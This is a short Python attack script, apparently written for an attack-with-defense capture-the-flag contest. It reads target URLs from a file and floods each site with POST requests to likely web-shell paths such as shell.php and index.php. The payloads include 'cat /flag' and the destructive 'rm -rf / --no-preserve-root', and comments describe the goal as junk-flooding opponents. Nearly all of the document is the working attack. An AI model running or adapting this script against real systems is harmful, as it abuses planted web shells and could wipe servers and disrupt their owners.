import requests
import time

def scan_attack():
    U=open('H:/Python3.0Work/AWD/Url.txt','r')
    A=U.readlines()
    for i in range(0,len(A)):
        # Url=A[i].replace(" -- 200","")
        Url=A[i]
        Url=Url.replace('\n','')
        file={'shell.php','admin.php','web.php','login.php','1.php','index.php'}
        payload={'cat /flag','Happy','rm -rf / --no-preserve-root'}
        H=1
        while H<150:  #垃圾包发送次数
            for ii in file:
                url=Url+'/'+ii
                print("针对",[url],"已经搅屎",H,"次")
                for iii in payload:
                    data={
                        'payload':iii
                    }
                    try:
                        requests.post(url,data=data)
                        print("正在搅屎:"+str(i)+'|'+ii+'|'+iii)
                        H+=1
                        time.sleep(0.01)
                    except Exception as e:
                        time.sleep(0.01)
                        pass


if __name__ == '__main__':
    scan_attack()
